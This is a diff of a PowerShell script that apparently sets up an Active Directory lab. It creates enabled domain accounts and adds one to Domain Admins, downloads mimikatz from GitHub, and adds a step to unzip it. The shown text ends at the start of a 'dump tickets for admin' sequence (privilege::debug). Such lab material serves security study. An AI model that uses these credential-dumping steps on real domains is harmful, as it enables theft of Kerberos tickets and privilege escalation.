@@ -52,8 +52,8 @@ Install-ADDSForest
 Get-Service adws,kdc,netlogon,dns
 
 #Add users account to domain
-New-ADUser -Name "admin" -PasswordNeverExpires $true  -AccountPassword (ConvertTo-SecureString -AsPlainText -String '****' -Force)
-New-ADUser -Name "user" -PasswordNeverExpires $true -AccountPassword (ConvertTo-SecureString -AsPlainText -String '****' -Force)
+New-ADUser -Name "admin" -PasswordNeverExpires $true -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText -String '****' -Force)
+New-ADUser -Name "user" -PasswordNeverExpires $true -Enabled $true -AccountPassword (ConvertTo-SecureString -AsPlainText -String '****' -Force)
 
 #Add user account to group
 Add-ADGroupMember -Identity "Domain Admins" -Members admin
@@ -113,6 +113,9 @@ runas /user:cheez powershell.exe
 #Download mimikatz
 #[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "mimikatz_trunk.zip"
+
+#Unzip mimikatz
+Expand-Archive 'mimikatz_trunk.zip'
 
 #Dump tickets for admin
 privilege::debug
